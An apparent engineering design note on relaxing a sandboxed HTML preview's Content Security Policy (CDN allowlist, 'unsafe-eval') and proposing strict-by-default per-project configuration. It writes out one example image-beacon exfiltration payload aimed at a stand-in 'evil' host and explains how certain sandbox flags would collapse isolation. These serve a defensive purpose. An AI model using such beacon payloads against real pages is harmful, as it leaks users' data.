# MDT-221 — Security Trade-offs & Configuration Path

> This document records the gap between MDT-221's approved strict security
> contract and what was actually required to make real "working" HTML design
> files render correctly. It is the basis for either (a) a follow-up
> configuration CR that makes the relaxations opt-in per project, or (b) a full
> UAT pass that delivers a validated "soft" configuration.
>
> **Canonical contract remains the strict version.** The relaxations below are
> deviations introduced under time pressure; they are recorded here, not
> silently absorbed into the spec.

## 1. The trade-offs we took to make it work

When design3.html (a real, representative working HTML file) was previewed, the
strict CSP blocked everything that makes it function. Three relaxations were
needed, each with a specific reason:

### 1.1 External CDN allowlist (script-src / style-src / font-src)

- **Strict contract**: `default-src 'none'` — no external origins anywhere.
- **What we allowed**: `https://cdn.tailwindcss.com`, `https://cdn.jsdelivr.net`
  (script + style), `https://fonts.googleapis.com`, `https://fonts.gstatic.com`
  (style + font).
- **Why**: design3.html loads Tailwind (CDN JIT), Alpine.js (jsDelivr), and
  Google Fonts literally via `<script src>`/`<link href>`. These are not
  exotic — they are the dominant CDN stack for prototype/design HTML. Without
  them the file renders as raw unstyled markup.
- **What still holds**: `connect-src 'none'` (no fetch/XHR), `img-src 'self' data:`
  (no external image loads / beacons), opaque-origin sandbox (no parent access).
- **Residual risk**: an external script from an allowed CDN runs in the sandbox.
  It cannot reach the parent or call `/api`, but it could attempt
  self-navigation exfiltration (bounded by the 5-min owner-minted token TTL).

### 1.2 `unsafe-eval` in script-src

- **Strict contract**: `script-src 'self' 'unsafe-inline'` — no `unsafe-eval`.
- **What we allowed**: added `'unsafe-eval'`.
- **Why**: Alpine.js evaluates `x-data`/`x-init` directive strings as code via
  `new Function()`. The Tailwind CDN JIT compiler also evaluates configuration
  strings. Both are architecturally incapable of working without `unsafe-eval`.
  Without it, Alpine's click handlers never wire up — which is exactly the
  "Trace Graph modal stuck open, cannot close" symptom.
- **What still holds**: the opaque-origin sandbox is unaffected by `unsafe-eval`
  (verified: parent JS still cannot read `iframe.contentDocument`). The
  eval-capable scripts still cannot reach the parent, cookies, localStorage, or
  `/api` (connect-src none).
- **Residual risk**: `unsafe-eval` is, on paper, a primary XSS vector — if an
  attacker could inject content into the previewed file, they could run
  arbitrary string-as-code. In v1 the only minter is the owner previewing their
  own file, so the injection scenario requires the owner to have placed
  malicious code in their own design doc.

### 1.3 (For the record) What we did NOT relax

These stayed strict despite the pressure, and should remain non-negotiable in
any follow-up configuration model:

- `allow-same-origin` — **never**. Combined with `allow-scripts` this collapses
  the entire sandbox; previewed HTML could read parent localStorage and the API
  cookie. This is the one token that must never appear.
- `connect-src` — stayed `'none'`. No credentialed network channel, no
  programmatic data exfiltration via fetch/XHR/WebSocket.
- `img-src` — stayed `'self' data:`. External image loads blocked (prevents
  `<img src="https://evil/?data">` beacon exfiltration).
- `default-src 'none'` with no `object-src` override — blocks `<object>`/
  `<embed>` SVG script vectors.

## 2. Configuration advice — strict by default, opt-in per project

The right long-term home for these relaxations is a **per-project, opt-in
configuration**, not a global default. Proposed shape (for the follow-up CR):

```toml
# .mdt-config.toml
[project.document.preview]
# Strict by default. The owner consciously opts in to relaxations for the
# specific external domains and capabilities their working HTML needs.

# External origins the project's HTML files may load script/style/font from.
# Empty by default (no external origins). Each domain is a conscious decision.
allowedExternalDomains = [
  "cdn.tailwindcss.com",
  "cdn.jsdelivr.net",
  "fonts.googleapis.com",
  "fonts.gstatic.com",
]

# Allow eval-based frameworks (Alpine.js, Tailwind CDN JIT, etc.).
# Default false. Set true only if the project's HTML uses such frameworks.
allowUnsafeEval = true
```

The serving route reads this config per request and derives the CSP:

```text
script-src  'self' 'unsafe-inline' [+ 'unsafe-eval' if allowUnsafeEval] [<allowed script/style domains>]
style-src   'self' 'unsafe-inline' [<allowed style domains>]
font-src    'self'                 [<allowed font domains>]
img-src     'self' data:           (always — never external)
connect-src 'none'                 (always — never relaxed)
```

**Why strict-by-default matters**: the moment a user adds a document path that
points at HTML, they should not silently get a wide-open CSP. They should see
the preview fail with a clear "this document wants to load from X, Y, Z and use
eval — configure `[project.document.preview]` to allow them." That surfacing
(dialog or error) is what makes the trade-off conscious rather than implicit.

## 3. Existing specs — keep the "right way," align everything to it

This is the tricky part you flagged. The resolution:

- **The strict CSP remains the canonical contract** in CR §4, architecture.md,
  the durable docs, and spec-trace requirement C-2.13. That is the "right way."
- **The deviations (§1.1, §1.2 above) are recorded as explicit, temporary
  deviations**, not folded into the contract. They are marked in:
  - This document (the trade-off rationale).
  - The close-report's "known trade-offs" section.
  - A code comment on `RAW_PREVIEW_CSP` pointing here.
- **The integration test (`document-raw.test.ts`) asserts the STRICT CSP** —
  not the relaxed one. The test documents the contract; the deviation is
  accepted as a known failure with a recorded reason until the follow-up CR
  either (a) makes the relaxations configurable, or (b) a UAT pass validates a
  shipped "soft" default.

This keeps the spec honest: anyone reading C-2.13 sees the intended strict
policy, and anyone reading the close-report sees that v1 shipped with a
documented deviation pending the configuration CR.

## 4. Follow-up ticket scope (sketch)

Either a focused CR or a UAT-driven configuration delivery:

1. Add `[project.document.preview]` config schema (allowedExternalDomains,
   allowUnsafeEval) — strict defaults.
2. Serving route derives CSP from config (replaces the hardcoded constant).
3. Mint endpoint statically scans the selected HTML's external `src`/`href`
   and returns a "needs approval" list when the config doesn't cover them.
4. Frontend dialog surfaces the list; user picks domains; persisted to config.
5. `RAW_PREVIEW_CSP` constant deleted; CSP is always per-request.
6. Re-tighten the integration test to assert the derived CSP matches config.
7. Default-config projects get the strict CSP — design3.html fails to render
   its CDNs until the owner opts in, with the dialog explaining why.

This is the proper version of what the stopgap approximated.
